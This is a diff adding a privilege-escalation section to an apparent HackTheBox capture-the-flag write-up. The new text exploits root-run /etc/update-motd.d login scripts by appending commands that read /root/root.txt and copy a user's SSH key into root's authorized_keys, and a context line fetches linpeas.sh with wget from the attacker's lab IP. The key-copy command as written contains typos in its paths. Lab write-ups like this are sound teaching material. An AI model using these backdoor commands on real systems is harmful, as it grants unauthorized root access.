@@ -240,7 +240,39 @@ wget http://10.10.14.21:80/linpeas.sh
 
 where the ip address is our own ip address on the HTB network, the port number is the port number used from the python command above and then the name of the file.
 
-When running both tools we see a file updating every minute, which looked like a Cron restoring /etc/update-motd.d/.
+When running both tools we see a file updating every minute, which looked like a Cron job restoring /etc/update-motd.d/.
 
 ![](.gitbook/assets/vmplayer_vnz5uo4nuo.png)
+
+Looking at the pspy output it would seem that the file is actually being updated every 30 seconds. This to me seams like a good way to priv esc if the settings on them are set up incorrectly.
+
+So navigating to the /etc/update-motd.d folder, we see this as our output for `ls -la`
+
+![](.gitbook/assets/vmplayer_a3w5a19cxp.png)
+
+we see that the scripts in this folder are executed as root. Which with a bit of googling we can see that these files are executed during user login.
+
+looking inside of the files we see that 00-header is the code that makes the banner apear when we logged in with ssh.
+
+![](.gitbook/assets/vmplayer_r20myslvgd.png)
+
+By appending the below code to the file we are able to print the root flag for the box. But what would we do if the key wasnt in the place that we would have of expected it to be. Well, thet would require us to use this exploit to gain root  shell.
+
+```text
+cat /root/root.txt
+```
+
+The way of doing this that I used was to copy over the webadmins authorized\_keys to the root's one. Then we can ssh in as root using the same key. To do this on the target machine we do:
+
+```text
+echo 'cat /home/webadmin/.ssh/authroized_keys >> /root.ssh/authorized_keys' >> 00-header
+```
+
+![](.gitbook/assets/vmplayer_nyjyg3q5pg.png)
+
+Now we need to re-connect using ssh to webadmin to trigger the header script to copy the key over to root.
+
+Once that is done, exit back out and ssh in as root using the same file as before. And you are root!
+
+
 
